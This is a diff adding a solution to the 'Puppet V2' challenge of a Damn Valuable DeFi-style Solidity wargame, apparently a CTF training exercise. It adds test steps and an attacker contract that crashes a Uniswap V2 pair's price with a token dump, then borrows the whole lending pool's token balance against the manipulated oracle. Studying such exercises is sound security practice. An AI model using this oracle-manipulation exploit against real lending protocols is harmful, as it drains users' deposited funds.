@@ -103,6 +103,12 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        PuppetV2Attacker puppetV2Attacker =
+        new PuppetV2Attacker{value: 20 ether}(address(puppetV2Pool), address(uniswapV2Pair), address(dvt), payable(address(weth)));
+        DamnValuableToken(dvt).transfer(address(puppetV2Attacker), ATTACKER_INITIAL_TOKEN_BALANCE);
+        puppetV2Attacker.attack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -120,4 +126,31 @@ contract PuppetV2 is Test {
         assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
     }
+}
+
+contract PuppetV2Attacker {
+    address puppetV2Pool;
+    address uniswapV2Pair;
+    address dvt;
+    address payable weth;
+    address attacker;
+
+    constructor(address puppetV2Pool_, address uniswapV2Pair_, address dvt_, address payable weth_) payable {
+        puppetV2Pool = puppetV2Pool_;
+        uniswapV2Pair = uniswapV2Pair_;
+        dvt = dvt_;
+        weth = weth_;
+        attacker = msg.sender;
+    }
+
+    function attack() external payable {
+        DamnValuableToken(dvt).transfer(uniswapV2Pair, 10000 ether);
+        IUniswapV2Pair(uniswapV2Pair).swap(9.9 ether, 0, address(this), ""); // token0 = weth, token1 = dvt
+        WETH9(weth).deposit{value: 20 ether}();
+        WETH9(weth).approve(puppetV2Pool, type(uint256).max);
+        PuppetV2Pool(puppetV2Pool).borrow(1_000_000 ether);
+        DamnValuableToken(dvt).transfer(attacker, 1_000_000 ether);
+    }
+
+    receive() external payable {}
 }
